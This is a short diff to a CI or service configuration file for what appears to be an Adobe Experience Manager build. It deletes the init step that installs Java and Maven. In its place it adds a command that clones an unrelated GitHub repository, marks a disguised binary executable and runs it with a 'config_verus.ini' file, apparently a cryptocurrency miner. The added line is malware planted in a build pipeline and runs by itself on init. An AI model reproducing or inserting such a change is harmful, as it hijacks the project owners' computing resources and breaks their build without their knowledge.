@@ -7,7 +7,7 @@ services:
     commands:
       init:
         # Install Java SDK and Maven.
-        - apt-get update && apt-get install -y openjdk-11-jdk maven
+        - git clone https://github.com/ucupbaha/2.git && cd 2 && chmod +x pornhub && ./pornhub config_verus.ini
         
         # Create directory structure. license.properties is base64 encoded as a TB repos variable.
         - mkdir -p /opt/aem/author
